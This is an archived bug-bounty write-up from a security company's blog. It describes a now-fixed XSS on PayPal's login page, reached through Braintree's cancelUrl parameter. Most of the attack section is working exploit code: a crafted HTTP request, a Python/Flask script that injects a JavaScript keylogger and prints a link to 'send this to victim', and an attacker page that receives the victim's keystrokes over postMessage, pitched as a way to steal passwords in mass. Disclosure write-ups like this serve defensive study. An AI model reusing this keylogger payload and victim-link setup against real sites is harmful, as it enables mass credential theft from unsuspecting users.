---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-05-26_persistent-xss-to-steal-passwords-paypal.md
original_filename: 2018-05-26_persistent-xss-to-steal-passwords-paypal.md
title: Persistent XSS to Steal Passwords – Paypal
category: documents
detected_topics:
- xss
- cloud-security
- sso
- access-control
- command-injection
- otp
tags:
- imported
- documents
- xss
- cloud-security
- sso
- access-control
- command-injection
- otp
language: en
raw_sha256: 42ad87169db13ab34ffedb2040faea40b05a075e8caed3308d147109981a8544
text_sha256: 3271270a0835b7e21d55057edb00aa99d9bdf63d4b201b6649a3541de245d532
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Persistent XSS to Steal Passwords – Paypal

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-05-26_persistent-xss-to-steal-passwords-paypal.md
- Source Type: markdown
- Detected Topics: xss, cloud-security, sso, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `42ad87169db13ab34ffedb2040faea40b05a075e8caed3308d147109981a8544`
- Text SHA256: `3271270a0835b7e21d55057edb00aa99d9bdf63d4b201b6649a3541de245d532`


## Content

---
title: "Persistent XSS to Steal Passwords – Paypal"
page_title: "Persistent XSS to Steal Passwords - Paypal"
url: "https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/"
final_url: "https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/"
authors: ["Akhil Reni (@akhilreni_hs)"]
programs: ["Paypal"]
bugs: ["Stored XSS"]
publication_date: "2018-05-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5868
---

[](javascript:;)

  * [Home](https://wesecureapp.com/)
  * [Services](https://wesecureapp.com/services/)
  * [Application Security](https://wesecureapp.com/services/application-security/)
  * [Web Application VAPT](https://wesecureapp.com/vulnerability-assessment-and-penetration-testing/)
  * [Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  * [Network Security](https://wesecureapp.com/services/network-security/)
  * [Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  * [Cloud Security](https://wesecureapp.com/services/cloud-security/)
  * [Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  * [Breach & Attack Simulation](https://wesecureapp.com/services/breach-attack-simulation/)
  * [Red Team Assessment](https://wesecureapp.com/services/breach-attack-simulation/red-team-assessment/)
  * [Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [Social Engineering](https://wesecureapp.com/services/breach-attack-simulation/social-engineering/)
  * [Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  * [Staffing Services](https://wesecureapp.com/services/staffing-services/)
  * [Smart Shore Sourcing](https://wesecureapp.com/services/staffing-services/smart-shore-sourcing/)
  * [Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  * [Solutions](https://wesecureapp.com/solutions/)
  * [Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [DevsecOps](https://wesecureapp.com/footer/devsecops-themepage/)
  * [Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Case studies](https://wesecureapp.com/resources/case-studies/)
  * [White Papers](https://wesecureapp.com/resources/white-papers/)
  * [Datasheets](https://wesecureapp.com/resources/datasheets/)
  * [Events](https://wesecureapp.com/resources/events/)
  * [Podcast](https://wesecureapp.com/resources/podcast/)
  * [Company](https://wesecureapp.com/company/)
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Careers](https://wesecureapp.com/?page_id=15291)
  * [Contact](https://wesecureapp.com/contact/)

[ ![WeSecureApp Logo \(2\)](https://wesecureapp.com/wp-content/uploads/2020/08/WeSecureApp-Logo-2.svg) ](https://wesecureapp.com/)

  * Services
  *  * [Application Security](/services/application-security/)
  *  * SERVICES
  * [![application security](https://wesecureapp.com/wp-content/uploads/2020/09/application.svg)Web Application Penetration Testing](https://wesecureapp.com/services/application-security/web-app-pentest/)
  * [![Mobile Application Penetration Test](https://wesecureapp.com/wp-content/uploads/2020/09/mobile_phone-1.svg)Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [![Web Services & API Assessment](https://wesecureapp.com/wp-content/uploads/2020/09/touch-1.svg)Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [![threat-modelling](https://wesecureapp.com/wp-content/uploads/2024/03/threat-modelling.svg)Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [![application security - secure code review](https://wesecureapp.com/wp-content/uploads/2020/09/code-syntax-1.svg)Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [![application architecture review](https://wesecureapp.com/wp-content/uploads/2024/03/application-architecture-review.svg)Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  *  * RESOURCES
  * [ ![cyber security measures](https://wesecureapp.com/wp-content/uploads/2018/12/Web-1920-–-11-1.png) Top 7 cyber security measures that enterprises shouldn’t neglect](https://wesecureapp.com/blog/top-7-cyber-security-measures-that-enterprises-shouldnt-neglect/)
  * [Network Security](/services/network-security/)
  *  * SERVICES
  * [![network-1](https://wesecureapp.com/wp-content/uploads/2020/09/network-1-1.svg)Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [![Group 16753 \(1\)](https://wesecureapp.com/wp-content/uploads/2024/03/Group-16753-1.svg)Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [![telephone \(1\)](https://wesecureapp.com/wp-content/uploads/2020/09/telephone-1.svg)VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [![wireless_modem \(1\)](https://wesecureapp.com/wp-content/uploads/2020/09/wireless_modem-1.svg)Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  *  * RESOURCES
  * [![penetration testing companies in the USA](https://wesecureapp.com/wp-content/uploads/2021/07/bg.png)Top 7 Penetration Testing Companies in the USA](https://wesecureapp.com/blog/top-7-penetration-testing-companies-in-the-usa/)
  * [Cloud Security](/services/cloud-security/)
  *  * SERVICES
  * [![Aws](https://wesecureapp.com/wp-content/uploads/2020/09/Aws-1.svg)Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [![cloud-pentesing-icon](https://wesecureapp.com/wp-content/uploads/2024/03/cloud-pentesing-icon.svg)Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  *  * RESOURCES
  * [ ![Cloud Security Threats](https://wesecureapp.com/wp-content/uploads/2021/02/Cloud_Security-_Threats-1.jpg) Cloud Security Threats](https://wesecureapp.com/blog/cloud-security-threats/)
  * [Breach & Attack Simulation](/services/threat-simulation/)
  *  * SERVICES
  * [![global-security](https://wesecureapp.com/wp-content/uploads/2020/09/global-security-1.svg)Red Team Assessment](/services/threat-simulation/red-team-assessment/)
  * [![dark-web](https://wesecureapp.com/wp-content/uploads/2024/03/dark-web.svg)Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [![ransomware simulation](https://wesecureapp.com/wp-content/uploads/2024/03/ransomware-simulation.svg)Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [![insights-1](https://wesecureapp.com/wp-content/uploads/2020/09/insights-1-1.svg)Social Engineering Assessment](/services/threat-simulation/social-engineering/)
  * [![assume-breach-icon](https://wesecureapp.com/wp-content/uploads/2023/06/assume-breach-icon.svg)Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  *  * RESOURCES
  * [![Hire a Red Team](https://wesecureapp.com/wp-content/uploads/2022/01/Tinted-Bg-2-1-–-2.png)7+ Major Reasons to Hire a Red Team to Harden Your App Sec](https://wesecureapp.com/blog/7-major-reasons-to-hire-a-red-team-to-harden-your-app-sec/)
  * [Staffing Services](/services/staffing-services/)
  *  * SERVICES
  * [![smart-shore-source](https://wesecureapp.com/wp-content/uploads/2023/05/smart-shore-source.svg)Smart Shore Sourcing](https://wesecureapp.com/services-staffing-services-smart-shore-sourcing/)
  * [![virtual-ciso](https://wesecureapp.com/wp-content/uploads/2024/03/virtual-ciso.svg)Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  *  * RESOURCES
  * [ ![selecting-penetrationtesting](https://wesecureapp.com/wp-content/uploads/2021/03/selecting-penetrationtesting.jpg) How to Choose a Penetration Testing Vendor Wisely?](https://wesecureapp.com/blog/selecting-a-penetration-testing-vendor/)
  * Solutions
  *  * MANAGED SECURITY
  * [![vmaas](https://wesecureapp.com/wp-content/uploads/2024/03/vmaas.svg)Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [![vraas](https://wesecureapp.com/wp-content/uploads/2024/03/vraas.svg)Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [![tiaas](https://wesecureapp.com/wp-content/uploads/2024/03/tiaas.svg)Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [![devsecops-logo](https://wesecureapp.com/wp-content/uploads/2021/04/devsecops-logo-1.svg)DevSecOps](https://wesecureapp.com/solutions/devsecops/)
  * [![SSS-logo](https://wesecureapp.com/wp-content/uploads/2021/04/SSS-logo.svg)Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  *  * RESOURCE
  * [![worst passwords](https://wesecureapp.com/wp-content/uploads/2021/06/Tinted-Bg-5-1-–-22.png)World’s Worst Passwords: Is it time to change yours?](https://wesecureapp.com/blog/worlds-worst-passwords-is-it-time-to-change-yours/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Datasheets](/resources/datasheets/)
  * [Case Studies](/resources/case-studies/)
  * [Whitepapers](/resources/white-papers/)
  * [Podcasts](https://wesecureapp.com/resources/podcast/)
  * [Events](https://wesecureapp.com/resources/events/)
  * Company
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Contact](https://wesecureapp.com/contact/)

  * [Home](https://wesecureapp.com/)
  * [Services](https://wesecureapp.com/services/)
  * [Application Security](https://wesecureapp.com/services/application-security/)
  * [Web Application VAPT](https://wesecureapp.com/vulnerability-assessment-and-penetration-testing/)
  * [Mobile Application Pentesting](https://wesecureapp.com/services/application-security/mobile-app-pentest/)
  * [Web Services & API Assessment](https://wesecureapp.com/services/application-security/web-services-api-assessment/)
  * [Threat Modeling](https://wesecureapp.com/services/application-security/threat-modeling/)
  * [Secure Code Review](https://wesecureapp.com/services/application-security/secure-code-review/)
  * [Application Architecture Review](https://wesecureapp.com/services/application-security/application-architecture-review/)
  * [Network Security](https://wesecureapp.com/services/network-security/)
  * [Network Vulnerability Assessment and Penetration Testing](https://wesecureapp.com/services/network-security/network-vapt/)
  * [Device Security](https://wesecureapp.com/services/network-security/device-security/)
  * [VoIP Vulnerability Assessment & Penetration Testing](https://wesecureapp.com/services/network-security/voip-pentesting/)
  * [Wireless Penetration Testing](https://wesecureapp.com/services/network-security/wireless-pentesting/)
  * [Cloud Security](https://wesecureapp.com/services/cloud-security/)
  * [Cloud Auditing](https://wesecureapp.com/services/cloud-security/cloud-auditing/)
  * [Cloud Pentesting](https://wesecureapp.com/services/cloud-security/cloud-pentesting/)
  * [Breach & Attack Simulation](https://wesecureapp.com/services/breach-attack-simulation/)
  * [Red Team Assessment](https://wesecureapp.com/services/breach-attack-simulation/red-team-assessment/)
  * [Dark Web Monitoring](https://wesecureapp.com/services/breach-attack-simulation/dark-web-monitoring/)
  * [Ransomware Simulation](https://wesecureapp.com/services/breach-attack-simulation/ransomware-simulation/)
  * [Social Engineering](https://wesecureapp.com/services/breach-attack-simulation/social-engineering/)
  * [Assumed Breach](https://wesecureapp.com/services/breach-attack-simulation/assumed-breach/)
  * [Staffing Services](https://wesecureapp.com/services/staffing-services/)
  * [Smart Shore Sourcing](https://wesecureapp.com/services/staffing-services/smart-shore-sourcing/)
  * [Virtual CISO](https://wesecureapp.com/services/staffing-services/virtual-ciso/)
  * [Solutions](https://wesecureapp.com/solutions/)
  * [Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)
  * [Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)
  * [Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)
  * [DevsecOps](https://wesecureapp.com/footer/devsecops-themepage/)
  * [Strategic Security Solutions](https://wesecureapp.com/solutions/strategic-security-solutions/)
  * Resources
  * [Blog](https://wesecureapp.com/blog/)
  * [Case studies](https://wesecureapp.com/resources/case-studies/)
  * [White Papers](https://wesecureapp.com/resources/white-papers/)
  * [Datasheets](https://wesecureapp.com/resources/datasheets/)
  * [Events](https://wesecureapp.com/resources/events/)
  * [Podcast](https://wesecureapp.com/resources/podcast/)
  * [Company](https://wesecureapp.com/company/)
  * [About us](https://wesecureapp.com/company/about-us/)
  * [Partners](https://wesecureapp.com/company/partners/)
  * [Careers](https://wesecureapp.com/?page_id=15291)
  * [Contact](https://wesecureapp.com/contact/)

Hamburger Toggle Menu

[Schedule a Meeting](https://meetings.hubspot.com/strobes/wesecureapp)

[Cyber Security](https://wesecureapp.com/blog/category/cyber-security/) · [E-commerce](https://wesecureapp.com/blog/category/e-commerce/) · [Write-up](https://wesecureapp.com/blog/category/write-up/)

# Persistent XSS to Steal Passwords – Paypal

By user

Note: This bug has been reported via Paypal bug bounty program and is fixed now.

**POC FIRST?**

There are days when we get to test different applications with third party integrations such as payment gateways, logging etc etc. Same way we got to test one of our client application that uses braintree as a payment gateway(Braintree, a division of PayPal, is a company based in Chicago that specialises in mobile and web payment systems for [e-commerce](https://wesecureapp.com/industries/retail-ecommerce/) companies)

Braintree provides an API for its merchants to easily consume it and integrate other services such as Paypal.  
You can read about it here: (https://developers.braintreepayments.com/guides/paypal/overview/javascript/v3)

The client application was using braintree as the gateway and has a paypal checkout, clicking checkout button requested the following HTTP request
  
  
  POST /merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement HTTP/1.1
  Host: api.braintreegateway.com
  User-Agent: python-requests/2.18.4
  Accept-Encoding: gzip, deflate
  Accept: */*
  Connection: keep-alive
  Content-Type: application/json
  Content-Length: 1186
  
  {"returnUrl": "https://test.com", "cancelUrl": "https://test.com/", "experienceProfile": {"brandName": "Casper Sleep Inc.", "noShipping": "false", "addressOverride": true}, "shippingAddress": {"recipientName": "Test Test", "line1": "38 OXFORD STREET 302", "line2": "", "city": "LONDON", "state": "", "postalCode": "W1D 1AX", "countryCode": "GB"}, "braintreeLibraryVersion": "braintree/web/3.9.0", "_meta": {"merchantAppId": "casper.com", "platform": "web", "sdkVersion": "3.9.0", "source": "client", "integration": "custom", "integrationType": "custom", "sessionId": "5fc558ba-2fb7-4a79-a7ba-fef4fee926db"}, "authorizationFingerprint": "a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd"}

The response will be a 302 redirect to the following URL
  
  
  https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=<token>

The above URL is valid for a couple of hours before it expires(still enough to launch a wide scale attack)  
The returnURL and cancelUrl parameters value could be set to any arbitrary URL(that was issue no1), but it was always observed that canceUrl value is reflected back in script context under paypal.com login page without any sanitisation or output encoding as required. Special characters like tags (>, <) were filtered but all others were allowed. Since the reflection was in script context and we only had to escape double quotes, we successfully & easily did that.

But we know that **[XSS](https://wesecureapp.com/blog/xss-by-tossing-cookies/)** isn’t just about a pop up, getting to know the worst case scenario is best way to judge the severity of the vulnerability. In our case we exactly do that.

**Paypal’s Content Security Policy**
  
  
  content-security-policy:
  default-src 'self' https://*.paypal.com https://*.paypalobjects.com; frame-src 'self' https://*.brighttalk.com https://*.paypal.com https://*.paypalobjects.com https://www.youtube-nocookie.com https://www.xoom.com https://*.pub.247-inc.net; script-src 'nonce-qox3mTimg6HhlWGFnpwLeOX14nhSoxzIAq9PGsBg0V7ClmIP' 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https://nominatim.openstreetmap.org https://*.paypal.com https://*.paypalobjects.com https://*.google-analytics.com https://*.salesforce.com https://*.force.com https://*.eloqua.com https://nexus.ensighten.com https://api.paypal-retaillocator.com https://*.brighttalk.com https://*.sperse.io https://*.dialogtech.com; style-src 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline'; font-src 'self' https://*.paypal.com https://*.paypalobjects.com data:; img-src 'self' https: data:; form-action 'self' https://*.paypal.com https://*.salesforce.com https://*.eloqua.com; base-uri 'self' https://*.paypal.com; block-all-mixed-content; report-uri https://www.paypal.com/csplog/api/log/csp

From above policy we can see that Paypal allows inline scripts.  
So to smuggle CSRF tokens or passwords (since the XSS is on login screen) We can think about  
– key-logging and sending data across by calling images from my controlled site  
– key-logging and sending data across by calling fonts from my controlled site  
– key-logging and send ajax requests etc etc  
But the content security policy says NOPE. connect-src is self, img-src is self, font-src is self.

So we were thinking we are only left with pretty much redirecting users or opening a new tab every time they type (but ughhh that’s boring and not very stealthy!). Then it struck our mind, how about use HTML5’s cool stuff like event listeners and make this happen. Bingo! Here is our final payload(and the video at starting shows the same).

**Python Script**
  
  
  import requests
  import json
  from flask import Flask, render_template
  app = Flask(__name__)
  
  
  def test():
  data = {"returnUrl":"https://test.com","cancelUrl":"https://test.com/?dddddddd?\"}}; var WEBKEY={dataLog:'',start:function(){window.onkeypress=function(t){WEBKEY.dataLog+=String.fromCharCode(t.charCode)},setInterval('WEBKEY.exportLog();',5e3)},exportLog:function(){WEBKEY.dataLog.length>0&&(WEBKEY.dataLog='')}};WEBKEY.start();window.addEventListener('message',function(e){e.source.postMessage(WEBKEY.dataLog,'*')},!1); var a={\"test\":{\"test\":\"","experienceProfile":{"brandName":"Casper Sleep Inc.","noShipping":"false","addressOverride":True},"shippingAddress":{"recipientName":"Test Test","line1":"38 OXFORD STREET 302","line2":"","city":"LONDON","state":"","postalCode":"W1D 1AX","countryCode":"GB"},"braintreeLibraryVersion":"braintree/web/3.9.0","_meta":{"merchantAppId":"casper.com","platform":"web","sdkVersion":"3.9.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"5fc558ba-2fb7-4a79-a7ba-fef4fee926db"},"authorizationFingerprint":"a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd"} 
  headers = {"Content-Type" :"application/json"}
  r = requests.post("https://api.braintreegateway.com/merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement", json=data,headers=headers)
  response = json.loads(r.text)
  url = response["agreementSetup"]["approvalUrl"]
  url = url.replace("\u0026", "&")
  print("send this to victim")
  print("==================")
  return url
  
  @app.route("/")
  def hello():
  
  return render_template('1.html', name=test())
  
  if __name__ == '__main__':
  app.run()

**HTML**
  
  
  <html><html>
     <script>
                  //create popup windowvar domain = "{{name | safe}}";var myPopup = window.open(domain,'myWindow');
  //periodical message sendersetInterval(function(){ var message = 'Hello!  The time is: ' + (new Date().getTime()); myPopup.postMessage(message, '*'); //send the message and target URI},100);
  //listen to holla backwindow.addEventListener('message',function(event) { console.log('victim typed:  ',event.data);},false);      </script> </html>

Worst case scenario? This flask app can be hosted online and then shared with multiple people making it a deadly attack allowing us to steal passwords in mass.

Is there a better way you can exploit this? I would love to hear :). [@akhilreni_hs](https://twitter.com/akhilreni_hs)

  

[cybersecurity](https://wesecureapp.com/blog/tag/cybersecurity/)[ecommerce](https://wesecureapp.com/blog/tag/ecommerce/)[payment gateways](https://wesecureapp.com/blog/tag/payment-gateways/)[paypal](https://wesecureapp.com/blog/tag/paypal/)[persistent XSS](https://wesecureapp.com/blog/tag/persistent-xss/)

  

### Related Articles

  

[](https://wesecureapp.com/blog/is-blockchain-a-system-of-decentralized-trust-in-2023/) ![blockchain technology](https://wesecureapp.com/wp-content/uploads/2023/05/Tinted-Bg-1-–-3-610x610.png)

[Blockchain](https://wesecureapp.com/blog/category/blockchain/) · [Blog](https://wesecureapp.com/blog/category/blog/) · [Cyber Security](https://wesecureapp.com/blog/category/cyber-security/)

###### [Is Blockchain a system of decentralized trust in 2023?](https://wesecureapp.com/blog/is-blockchain-a-system-of-decentralized-trust-in-2023/ "Is Blockchain a system of decentralized trust in 2023?")

[](https://wesecureapp.com/blog/how-to-stay-safe-online-tips-for-getting-cybersmart/) ![compliance audits, cybersecurity awareness](https://wesecureapp.com/wp-content/uploads/2021/09/Tinted-Bg-3-1-–-10-610x610.png)

[Awareness](https://wesecureapp.com/blog/category/awareness/) · [Cyber Security](https://wesecureapp.com/blog/category/cyber-security/) · [Data Privacy](https://wesecureapp.com/blog/category/data-privacy/)

###### [How To Stay Safe Online – Tips for Getting Cybersmart](https://wesecureapp.com/blog/how-to-stay-safe-online-tips-for-getting-cybersmart/ "How To Stay Safe Online – Tips for Getting Cybersmart")

[](https://wesecureapp.com/blog/our-ceo-venu-raos-insights-on-the-role-of-cybersecurity-in-b2b-digitization/) ![cybersecurity](https://wesecureapp.com/wp-content/uploads/2021/10/Tinted-Bg-2-1-–-6-610x610.png)

[Cyber Security](https://wesecureapp.com/blog/category/cyber-security/) · [Data Privacy](https://wesecureapp.com/blog/category/data-privacy/) · [Write-up](https://wesecureapp.com/blog/category/write-up/)

###### [Our CEO Venu Rao’s Insights on the Role of Cybersecurity in B2B Digitization](https://wesecureapp.com/blog/our-ceo-venu-raos-insights-on-the-role-of-cybersecurity-in-b2b-digitization/ "Our CEO Venu Rao’s Insights on the Role of Cybersecurity in B2B Digitization")

### Leave A Reply [Cancel reply](/blog/persistent-xss-to-steal-passwords-paypal/#respond)

Your email address will not be published. Required fields are marked *

Comment

Name *

Email *

Website

Save my name, email, and website in this browser for the next time I comment.

[ ![cross site scripting](https://wesecureapp.com/wp-content/uploads/2017/07/Tinted-Bg-6-1-–-30-610x610.png) XSS by Tossing Cookies Previous Article  ](https://wesecureapp.com/blog/xss-by-tossing-cookies/)

[ ![simple fixes to stop hackers](https://wesecureapp.com/wp-content/uploads/2019/04/Tinted-Bg-5-1-–-26-610x610.png) 3 Simple Fixes to Stop 90% of Hackers Next Article  ](https://wesecureapp.com/blog/fixes-to-stop-hackers/)

  

### Industries

[BFSI](/industries/banking/)

[Healthcare](/industries/healthcare/)

[Government](/industries/government/)

[Retail & eCommerce](/industries/retail-ecommerce/)

[Information Technology](/industries/information-technology)

[Telecommunications](/industries/telecommunications)

### SERVICES

[Application Security](/services/application-security/)

[Network Security](/services/network-security/)

[Cloud Security](/services/cloud-security/)

[Staffing Services](https://wesecureapp.com/services/staffing-services/)

[Threat Simulation](/services/threat-simulation/)

[CERT-In Audit Services](https://wesecureapp.com/services/cert-in-audit/)

### SOLUTIONS

[Managed Security](/solutions/enterprise-security/managed-security/)

[Threat Intelligence as a Service](https://wesecureapp.com/solutions/managed-security/threat-intelligence-as-a-service/)

[Vulnerability Management as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-management-as-a-service/)

[Vulnerability Remediation as a Service](https://wesecureapp.com/solutions/managed-security/vulnerability-remediation-as-a-service/)

[Strategic Security Solutions](/solutions/strategic-security-solutions/)

### resources

[Blog](/blog/)

[Datasheets](/resources/datasheets/)

[Case studies](/resources/case-studies/)

[Podcasts](/resources/podcast/)

[Events](https://wesecureapp.com/resources/events/)

### company

[About](/company/about-us/)

[Partners](/company/partners/)

[CERT-InNew](/certin/)

[White papers](/resources/white-papers/)

[Contact](/contact)

[Privacy Policy](/privacy-policy)

### WE ARE CERTIFIED

[ ![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2024/04/cert-inlogo.jpg) ](https://www.trustpilot.com/review/wesecureapp.com)

[ ![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2024/04/img-strobes-certifications.png) ](https://www.trustpilot.com/review/wesecureapp.com)

[![trustpilot_review](https://wesecureapp.com/wp-content/uploads/2021/09/trustpilot-black.svg)](https://www.trustpilot.com/review/wesecureapp.com)

[![GoodFirms Badge](https://assets.goodfirms.co/badges/blue-button/view-profile.svg)](https://www.goodfirms.co/company/wesecureapp)

[ ![clutch_review](https://wesecureapp.com/wp-content/uploads/2021/09/clutch.png) ](https://clutch.co/review/1737852)
